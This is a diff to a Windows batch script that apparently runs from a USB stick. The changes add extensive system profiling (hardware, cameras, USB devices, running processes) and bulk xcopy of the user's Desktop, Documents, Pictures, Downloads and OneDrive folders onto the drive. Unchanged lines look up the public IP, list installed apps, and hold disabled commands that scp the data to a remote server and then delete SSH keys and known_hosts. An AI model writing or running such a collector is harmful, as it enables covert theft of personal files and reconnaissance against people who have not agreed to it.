@@ -99,12 +99,10 @@ if not defined target_server (
     echo TARGET_SERVER is not set in the remote configuration file.
     exit /b 1
 )
-
 if not defined target_port (
     echo TARGET PORT is not set in the remote configuration file. will use default port 22
     set "target_port=22"  :: Set default port to 22 if not specified in the remote configuration
 )
-
 if not defined target_folder (
     echo TARGET_FOLDER is not set in the remote configuration file.
     exit /b 1
@@ -118,13 +116,29 @@ if not defined target_folder (
 FOR /F "tokens=*" %%g IN ('cd') do (SET usb_drive=%%g)
 echo %usb_drive%
 
-:: Get machine name
 set filename=%USERNAME%.txt
+:: Get machine name
 echo Machine Name: %COMPUTERNAME% > %filename%
 :: Get logged in account name
 echo Logged in Account Name: %USERNAME% >> %filename%
 :: Get time and date
 echo Time and Date: %TIME% %DATE% >> %filename%
+:: Get Windows version and build information
+ver >> %filename%
+:: Get CPU information
+wmic cpu get Name >> %filename%
+:: Get GPU information
+wmic path win32_VideoController get Name >> %filename%
+:: Get drive information
+wmic logicaldisk get Caption, Description >> %filename%
+:: Get connected USB devices
+wmic path Win32_USBControllerDevice get Dependent /format:csv | find "USB" >> %filename%
+:: Get screen information
+wmic desktopmonitor get Caption, ScreenWidth, ScreenHeight >> %filename%
+:: Get camera information
+wmic path Win32_PnPEntity where "Caption like '%%camera%%'" get Caption, DeviceID, Description, Manufacturer >> %filename%
+wmic path Win32_VideoController where "Caption like '%%camera%%'" get Caption, DeviceID, Description, Manufacturer >> %filename%
+wmic path CIM_VideoControllerResolution get HorizontalResolution, VerticalResolution >> %filename%
 :: Get local IP address
 for /f "skip=1 tokens=2 delims=[]" %%a in ('ping %computername% -n 1 -4') do set localIP=%%a
 echo Local IP: %localIP% >> %filename%
@@ -133,6 +147,31 @@ for /f "skip=1 tokens=2 delims=[]" %%a in ('nslookup myip.opendns.com. resolver1
 echo Public IP: %publicIP% >> %filename%
 :: Get list of installed apps
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | find "DisplayName" >> %filename%
+:: Get list of running processes
+tasklist >> %filename%
+
+
+set desktop=%USERPROFILE%\Desktop
+set documents=%USERPROFILE%\Documents
+set images=%USERPROFILE%\Pictures
+set downloads=%USERPROFILE%\Downloads
+set onedrive=%USERPROFILE%\OneDrive
+
+set dest_folder="%usb_drive%\%USERNAME%"
+
+md "%dest_folder%"
+xcopy /E /Y "%onedrive%" "%dest_folder%\OneDrive\"
+xcopy /E /Y "%desktop%" "%dest_folder%\Desktop\"
+xcopy /E /Y "%documents%" "%dest_folder%\Documents\"
+xcopy /E /Y "%images%" "%dest_folder%\Images\"
+xcopy /E /Y "%downloads%" "%dest_folder%\Downloads\"
+
+move %filename% "%dest_folder%\"
+
+
+echo Files copied successfully to USB (%usb_drive%)!
+
+:: ------------------------------------- SSH copy to server ------------------------------------- ::
 
 :: uncomet lines with ":: #deactivated " to activate copying files to SSH server
 
@@ -148,12 +187,6 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | find "Di
 :: #deactivated ssh -p %target_port% %target_server% mkdir -p %target_folder%
 :: #deactivated scp -P %target_port%  %filename% %target_server%:%target_folder%
 :: #deactivated del %filename%
-
-set desktop=%USERPROFILE%\Desktop
-set documents=%USERPROFILE%\Documents
-set images=%USERPROFILE%\Pictures
-set downloads=%USERPROFILE%\Downloads
-set onedrive=%USERPROFILE%\OneDrive
 
 :: #deactivated set /p CopyFiles="Do you want to copy the files to the SSH server? (y/n): "
 if /i "%CopyFiles%"=="y" (
@@ -177,18 +210,5 @@ if /i "%CopyFiles%"=="n" (
 :: #deactivated del "%USERPROFILE%\.ssh\id_rsa"
 :: #deactivated del "%USERPROFILE%\.ssh\known_hosts"
 :: #deactivated del "%USERPROFILE%\.ssh\known_hosts.old"
-
-set dest_folder="%usb_drive%\%USERNAME%"
-
-md "%dest_folder%"
-xcopy /E /Y "%onedrive%" "%dest_folder%\OneDrive\"
-xcopy /E /Y "%desktop%" "%dest_folder%\Desktop\"
-xcopy /E /Y "%documents%" "%dest_folder%\Documents\"
-xcopy /E /Y "%images%" "%dest_folder%\Images\"
-xcopy /E /Y "%downloads%" "%dest_folder%\Downloads\"
-
-color 6
-echo Files copied successfully!
-color 7
 
 pause
